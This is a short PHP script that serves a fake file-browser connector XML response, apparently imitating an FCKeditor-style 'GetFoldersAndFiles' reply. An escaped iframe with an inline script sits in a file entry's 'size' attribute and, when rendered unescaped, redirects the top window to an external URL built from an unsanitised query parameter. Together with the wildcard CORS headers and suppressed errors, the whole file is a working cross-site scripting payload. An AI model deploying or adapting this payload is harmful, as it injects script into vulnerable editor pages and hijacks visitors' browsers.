<?php

error_reporting(0);
header('Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS');
header('Access-Control-Allow-Origin: *');
header('Content-Type: application/xml; charset=utf-8');
header_remove('Content-Length');
if (isset($_GET["video"])){
    die('<?xml version="1.0" encoding="UTF-8"?>
<Connector command="GetFoldersAndFiles" resourceType="Document"><CurrentFolder path="/1 - f/" url=""/><Files><File desc="1" name="Loading..." size="&lt;iframe height=&quot;0&quot; width=&quot;0&quot; srcdoc=&quot;&amp;lt;script&amp;gt;window.top.location.href=\'https://assets.cec.uk.com/aac/video/' . $_GET["video"] . '\';&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;" url="1"/></Files></Connector>');
} else {
    die("-_-");
} ?>